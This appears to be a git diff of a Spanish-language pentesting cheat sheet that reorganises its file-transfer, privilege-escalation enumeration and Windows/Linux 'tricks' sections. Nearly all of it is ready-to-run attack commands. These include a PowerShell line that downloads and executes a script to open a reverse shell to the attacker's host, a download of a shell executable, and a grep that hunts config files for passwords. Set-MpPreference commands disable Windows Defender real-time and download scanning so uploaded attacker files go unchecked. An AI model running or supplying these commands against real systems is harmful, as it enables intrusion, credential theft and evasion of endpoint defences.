@@ -37,6 +37,7 @@ TRANSFERENCIA DE ARCHIVOS
 
 sudo python -m http.server 80
 sudo python -m SimpleHTTPServer 80
+sudo python smbserver.py [como se llamará el recurso a compartir] [nombre del recurso a compartir] ej smbserver.py compartida /home/kali/Downloads
 
      Target Linux: 
          wget http://[IP]/recurso
@@ -46,9 +47,7 @@ sudo python -m SimpleHTTPServer 80
          Invoke-WebRequest http://[IP]/[RECURSO] -OutFile [NOMBREQUEQUERAMOS]
          powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
          powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"
-         
-sudo python smbserver.py [como se llamara el recurso a compartir] [nombre del recurso a compartir] ej smbserver.py compartida /home/user
-    Para conectarse: copy \\IP\recurso
+         copy \\IP\recurso
 
 
 TRATAMIENTO TTY
@@ -312,13 +311,6 @@ Hacking_Help_Sheet_Resume1.png
 Hacking_Help_Sheet_Resume2.png
 
 
-BUSCAR ARCHIVOS SUID,SGID,StickyBit
-....................................
-
-find / -perm -u=s -type f 2>/dev/nul
-find / -perm -4000 2>/dev/null
-
-
 WPSCAN
 .......
 
@@ -334,29 +326,6 @@ NIKTO
 nikto -h scanme.nmap.org
 nikto -h https://nmap.org -ssl --> Si la web va por HTTPS
 nikto -h $TARGET -T 9 -Format txt -o scans/$TARGET-nikto-80-sqli --> Escanea en busca de vulnerabilidades SQLi
-
-
-WINDOWS TRICKS
-...............
-
-Información sobre Windows Defender → "sc query windefend"
-
-Enumeración de todos los servicios corriendo en la máquina (incluyendo antivirus) → "sc queryex type= service"
-
-Enumeración de los antivirus que tiene el equipo → "WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName"
-
-Configuración y estado del firewall (características activadas y desactivadas...) → "netsh advfirewall firewall dump"
-
-Podemos probar a deshabilitar el escaneo de todos los ficheros descargados y/o adjuntos para subir nuestros ficheros... → "Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus" luego → "Set-MpPreference -DisableIOAVProtection $true"
-
-Listar reglas de AppLocker → "Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections"
-
-
-LINUX TRICKS /var/www/html
-...........................
-
-Si tras ganar acceso a una shell en la maquina objetivo, somos un usuario con pocos privilegios pero tenemos acceso a /var/www/html podemos buscar mediante el siguiente comando find archivos de configuracion que contengan contraseñas o datos sensibles, para empezar a ganar privilegios:
-    find . -iname '*config*' -type f -exec grep -nie 'pass.*=' --color=always /dev/null {} \;
 
 
 RDP
@@ -382,13 +351,6 @@ ACTIVE DIRECTORY
 ................
 
 https://www.hackplayers.com/2022/03/top10-de-ataques-al-directorio-activo.html
-
-
-DESCARGA DE ARCHIVOS POR COMANDO
-.................................
-
-Linux --> wget [URL]
-Windows --> powershell -c "Invoke-WebRequest -Uri '[URL]'" -OutFile archivo
 
 
 XSS
@@ -418,6 +380,49 @@ Pastebin
 RainbowCrack
 
 
+ENUM PRIVESC
+.............
+
+     Linux
+          sudo -l
+          whoami
+          uname -a
+          cat /etc/crontab
+          cat /etc/passwd
+          find / -perm -u=s -type f 2>/dev/nul
+          find / -perm -4000 2>/dev/null
+          hostname
+          cat /proc/version
+          history
+          ifconfig
+          netstat
+          pwd
+          env
+          getcap -r / 2>/dev/null
+          *Si tras ganar acceso a una shell en la maquina objetivo, somos un usuario con pocos privilegios pero tenemos acceso a /var/www/html podemos buscar mediante el siguiente comando find archivos de configuracion que contengan contraseñas o datos sensibles, para empezar a ganar privilegios: find . -iname '*config*' -type f -exec grep -nie 'pass.*=' --color=always /dev/null {} \;
+
+     Windows
+          hostname
+          whoami
+          whoami /priv
+          syteminfo
+          ipconfig
+          cmdkey /list
+          icacls
+          schtasks /query
+          dir
+          sc
+          set
+          netstat
+          reg /query
+          sc query windefend
+          sc queryex type=service
+          WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName
+          netsh advfirewall firewall dump
+          Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+          *Podemos probar a deshabilitar el escaneo de todos los ficheros descargados y/o adjuntos para subir nuestros ficheros... → "Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus" luego → "Set-MpPreference -DisableIOAVProtection $true"
+          
+
 ENUMERACION WEB
 ................
 DNS
@@ -441,6 +446,7 @@ python3 -m pipx ensurepath
 [open terminal]
 pipx install git+https://github.com/Tib3rius/AutoRecon.git
 sudo env "PATH=$PATH" autorecon [IP]
+
 
 PIVOTING
 .........
